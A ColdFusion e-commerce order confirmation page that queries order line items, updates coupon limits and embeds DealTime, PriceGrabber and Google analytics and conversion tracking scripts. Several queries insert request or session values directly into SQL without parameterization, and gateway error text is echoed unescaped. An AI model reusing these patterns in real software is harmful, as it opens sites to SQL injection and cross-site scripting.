<!--[if IE 8]><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">
<html xmlns="https://www.w3.org/1999/xhtml"><![endif]-->
<!--[if IE 7]><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">
<html xmlns="https://www.w3.org/1999/xhtml"><![endif]-->
<!--[if lte IE 6]><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">
<html xmlns="https://www.w3.org/1999/xhtml"><![endif]-->

<!--- (Daya 18Oct2010) for ROI Tracker - Start --->
<cftry>
	<cfset rOrderId="">
	<cfset rOrderAmount="">
	<cfset rProductId="">
	<cfset rProductName="">
	<cfset rCategoryId="">
	<cfset rCategoryName="">

		<cfset rOrderId="#key#">
		<cfset rOrderAmount="#Total#">
		<cfquery name="rsROI" datasource="#Application.dso#">
			SELECT o.ProductID,o.Product as ProductName, FIRST(s.SubCategoryID) as CategoryId, FIRST(s.SubCategory) as CategoryName
			FROM (OrderLineItems as o
			INNER JOIN Product_SUBCategory_Map as m ON o.productid=m.productid)
			INNER JOIN SubCategory as s ON m.subcategoryid=s.subcategoryid
			WHERE o.OrderId=#key#
			GROUP BY o.ProductID, o.Product
		</CFQUERY>
		<cfset rCount=0>
		<cfoutput query="rsROI">
			<cfset rCount=rCount+1>
			<cfif rCount eq 1>
				<cfset rProductId="#rsROI.ProductId#">
				<cfset rProductName="#rsROI.ProductName#">
				<cfset rCategoryId="#rsROI.CategoryId#">
				<cfset rCategoryName="#rsROI.CategoryName#">
			<cfelse>
				<cfset rProductId=rProductId & ',' & #rsROI.ProductId#>
				<cfset rProductName=rProductName & ',' & #rsROI.ProductName#>
				<cfset rCategoryId=rCategoryId & ',' & #rsROI.CategoryId#>
				<cfset rCategoryName=rCategoryName & ',' & #rsROI.CategoryName#>
			</cfif>

			<cfset rProductName=#replace(rProductName,"'","","all")#>
			<cfset rProductName=#replace(rProductName,",","","all")#>
			<cfset rCategoryName=#replace(rCategoryName,"'","","all")#>
			<cfset rCategoryName=#replace(rCategoryName,",","","all")#>
		</cfoutput>

<cfcatch type="any">
	<cfset rCount=1>
</cfcatch>
</cftry>
<!--- (Daya 18Oct2010) for ROI Tracker - End --->

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title><cf_title></title>
	<cf_meta10s>
<!--- (Daya 18Oct2010) for ROI Tracker Script - Start --->
	<script language="JavaScript">
		var merchant_id = '479189';
		var order_id = '<cfoutput>#rOrderId#</cfoutput>';
		var order_amt = '<cfoutput>#rOrderAmount#</cfoutput>';
		var category_id = '<cfoutput>#rCategoryId#</cfoutput>';
		var category_name = '<cfoutput>#rCategoryName#</cfoutput>';
		var product_id = '<cfoutput>#rProductId#</cfoutput>';
		var product_name = '<cfoutput>#rProductName#</cfoutput>';
	</script>
	<script language="JavaScript" src="https://stat.DealTime.com/ROI/ROI.js?mid=479189"></script>
<!--- (Daya 18Oct2010) for ROI Tracker Script - End --->
</head>


<body>

<div class="wrapper">

 <cf_minihdr-login>

<div class="content">

<!--thank you page starts-->

	<div id="crux" align="center"><font color="#0080C0">


<cfif v_response_code eq 1>
<h1>THANK YOU</h1>
<br />
<h2>Your order has been placed and you should receive a confirmation shortly.</h2>
Please call us if you have any questions about your order.




	<cfif #Session.CID# neq "">
		<cfquery name="getcoupon" datasource="#Application.ds#">
			Select limit from Coupons where CouponID = #Session.CID#
		</cfquery>
		<cfif #getcoupon.limit# gt 0>
		<cfset limit1 = #getcoupon.limit# - 1>
		<cfquery name="updatecoupon" datasource="#Application.ds#">
			update Coupons set limit = #limit1# where CouponID = #Session.CID#
		</cfquery>
		</cfif>
	</cfif>
<cfelse>
There was an error in processing your card. Please PRESS BACK try again!
<cfif findnocase("AVS mismatch",v_response_reasontext) GT 0>
Your zipcode and/or address does not match the billing information of your credit card.<br>Please PRESS BACK try again!
<cfelse>
(<cfoutput>#v_response_reasontext#</cfoutput>)
</cfif>

</cfif>


</font><p>

</div>

<br><br><br><br><br><br><br>
	<!-- checkout confirm entries ends -->




<!-- thankyou page ends -->



</div><!--end content-->

 <cf_miniftr>

</div><!--end wrapper-->



<script type="text/javascript"><!--

// Adjust the values of popup_pos_x, popup_pos_y to change the location of the popup layer on your confirmation page

popup_pos_x=50;

popup_pos_y=50;

// fill in the order number below

popup_order_number = '';

// fill in the email address below

popup_email = '';

//-->

</script>

<!-- PriceGrabber Merchant Evaluation Code -->

<script type="text/javascript" charset="UTF-8" src="https://www.pricegrabber.com/rating_merchrevpopjs.php?retid=17744"></script>

<noscript><a href="http://www.pricegrabber.com/rating_merchrev.php?retid=17744" target=_blank>

<img src="https://images.pricegrabber.com/images/mr_noprize.jpg" border="0" width="272" height="238" alt="Merchant Evaluation"></a></noscript>

<!-- End PriceGrabber Code -->


<img src="https://www.pricegrabber.com/conversion.php?retid=17744">



<cfoutput>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "http://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>



<cfif v_response_code eq 1>

<!-- Google Code for Sale Conversion Page -->
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 1063954859;
var google_conversion_language = "en";
var google_conversion_format = "2";
var google_conversion_color = "ffffff";
var google_conversion_label = "GJhpCI3TuwIQq9Oq-wM";
var google_conversion_value = 0;
/* ]]> */
</script>
<script type="text/javascript" src="https://www.googleadservices.com/pagead/conversion.js">
</script>
<noscript>
<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="https://www.googleadservices.com/pagead/conversion/1063954859/?label=GJhpCI3TuwIQq9Oq-wM&amp;guid=ON&amp;script=0"/>
</div>
</noscript>





<script type="text/javascript">
try {
  var pageTracker = _gat._getTracker("UA-11974017-1");
  pageTracker._trackPageview();
  pageTracker._addTrans(
    "#KEY#",                                     // Order ID
    "Google",                            // Affiliation
    "#total#",                                    // Total
    "#tax#",                                     // Tax
    "#shipping#",                                        // Shipping
    "#bill_city#",                                 // City
    "#bill_state#",                               // State
    "USA"                                       // Country
  );


<cfquery name="GetI" datasource="#Application.dso#">
	Select * from OrderLineItems Where OrderID = #KEY#
</cfquery>

<cfloop query="GetI">
  pageTracker._addItem(
    "#Key#",                                     // Order ID
    "#ProductID#",                                     // SKU
    "#product#",                                  // Product Name
    "",                             // Category
    "#price#",                                    // Price
    "#qty#"                                         // Quantity
  );
</cfloop>

  pageTracker._trackTrans();
} catch(err) {}</script>

</cfif>
</cfoutput>

</body>
</html>